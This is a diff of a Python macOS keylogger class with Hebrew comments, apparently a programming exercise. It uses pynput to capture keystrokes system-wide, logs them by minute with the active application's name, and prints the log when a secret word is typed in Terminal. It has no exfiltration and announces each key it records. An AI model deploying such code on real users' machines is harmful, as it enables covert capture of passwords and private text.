@@ -1,81 +1,91 @@
+from typing import Dict
 from collections import deque
-from typing import List, Dict
 from datetime import datetime
-from pynput.keyboard import Key
+from pynput.keyboard import Listener, Key
 import AppKit
 from key_logger_interface import KeyLoggerInterface
 
 
 class KeyLoggerService(KeyLoggerInterface):
-    MAGIC_WORD = "show"
-    MAGIC_APP = 'המסוף'
-
     def __init__(self):
-        self.key_logs_by_minute: Dict[str, str] = {}  # שמירת הקשות לפי דקה
-        self.last_keys = deque(maxlen=len(self.MAGIC_WORD))  # תור להקלדות אחרונות
-        self.is_logging = False  # האם הרישום מופעל
+        """אתחול משתנים לניהול הרישום"""
+        self.magic_word = "show"
+        self.magic_app = 'המסוף'
+        self.key_logs_by_minute = {}
+        self.last_keys = deque(maxlen=len(self.magic_word))
+        self.listener = None
+        self.is_listening = False
+
 
     def start_logging(self) -> None:
-        """מתחיל את הרישום של המקשים"""
-        self.is_logging = True
+        """מתחיל את המעקב אחרי מקשים"""
+        self.is_listening = True
+
+        self.listener = Listener(on_press=self.on_press)
+        self.listener.start()
 
     def stop_logging(self) -> None:
-        """מפסיק את הרישום של המקשים"""
-        self.is_logging = False
+        """מפסיק את המעקב אחרי מקשים"""
+        self.is_listening = False
+        if self.listener:
+            self.listener.stop()
+        print("\nLogging stopped.")
 
-    def get_logged_keys(self) -> List[str]:
-        """מחזיר את כל המקשים שנרשמו"""
-        return [key for keys in self.key_logs_by_minute.values() for key in keys]
+    def get_logged_keys(self) -> Dict[str, str]:
 
-    def log_key(self, key_name: str):
-        """רושם את המקש שנלחץ עם שם האפליקציה הפעילה"""
-        if not self.is_logging:
-            return
 
-        active_app = self.get_active_application()
-        current_time = self.get_current_time()
+        """מחזיר את המקשים שנלחצו עד כה ומאפס את המילון"""
+        keys = self.key_logs_by_minute
+        self.key_logs_by_minute = {}  # מאפס את המילון
+        return keys
 
-        # עדכון המידע בקובץ הרישום
-        if current_time in self.key_logs_by_minute:
-            self.key_logs_by_minute[current_time] += key_name
-        else:
-            self.key_logs_by_minute[current_time] = key_name
-
-        # הוספה לתור
-        self.last_keys.append((key_name, active_app))
-
-        # אם הוקלד ה"קסם", הצגת הלוגים
-        if self.is_time_to_show():
-            self.print_key_logs()
-            self.key_logs_by_minute.clear()
-
-    def is_time_to_show(self) -> bool:
-        """בודק האם יש להציג את הרישום"""
-        return "".join(t[0] for t in self.last_keys) == self.MAGIC_WORD and all(
-            t[1] == self.MAGIC_APP for t in self.last_keys)
-
-    def print_key_logs(self):
-        """מציג את הלוגים של המקשים"""
+    def print_key_logs(self) -> None:
+        """מדפיס את כל המקשים שנרשמו"""
         for timestamp, keys in self.key_logs_by_minute.items():
             print(f"-----{timestamp}-----")
             print(keys)
 
-    @staticmethod
-    def get_key_format(key) -> str:
-        """מקבל אובייקט של מקש ומחזיר אותו כטקסט"""
+    # -------- פונקציות פרטיות לניהול הלוגיקה --------
+
+    def get_key_format(self, key) -> str:
+        """מחזירה את המקש בפורמט מתאים"""
         if hasattr(key, 'char') and key.char is not None:
             return key.char
         elif hasattr(key, 'name') and key.name is not None:
             return f"[{key.name}]"
         return "[UNKNOWN]"
 
-    @staticmethod
-    def get_active_application() -> str:
-        """מחזיר את שם האפליקציה הפעילה"""
+    def get_active_application(self) -> str:
+        """מחזירה את שם האפליקציה הפעילה כרגע"""
         app = AppKit.NSWorkspace.sharedWorkspace().activeApplication()
         return app.get('NSApplicationName')
 
-    @staticmethod
-    def get_current_time() -> str:
-        """מחזיר את הזמן הנוכחי בפורמט הרצוי"""
-        return datetime.now().strftime("%Y-%m-%d %H:%M")
+    def log_key(self, key_name: str, active_app: str) -> None:
+        """רושם את ההקשה לפי זמן ואפליקציה פעילה"""
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M")
+        if current_time in self.key_logs_by_minute:
+            self.key_logs_by_minute[current_time] += key_name
+        else:
+            self.key_logs_by_minute[current_time] = key_name
+        self.last_keys.append((key_name, active_app))
+
+    def is_time_to_show(self) -> bool:
+        """בודקת אם המשתמש הקליד את המילה הסודית באפליקציה הנכונה"""
+        return "".join(t[0] for t in self.last_keys) == self.magic_word and \
+            all(t[1] == self.magic_app for t in self.last_keys)
+
+    def on_press(self, key) -> None:
+        """פונקציה שמטפלת באירוע לחיצת מקש"""
+        key_name = self.get_key_format(key)
+        active_app = self.get_active_application()
+        self.log_key(key_name, active_app)
+
+        print(f"Active app: {active_app}")
+        print(f"You pressed '{key_name}'")
+
+        if key == Key.esc:
+            self.stop_logging()
+
+        if self.is_time_to_show():
+            self.print_key_logs()
+            self.key_logs_by_minute.clear()
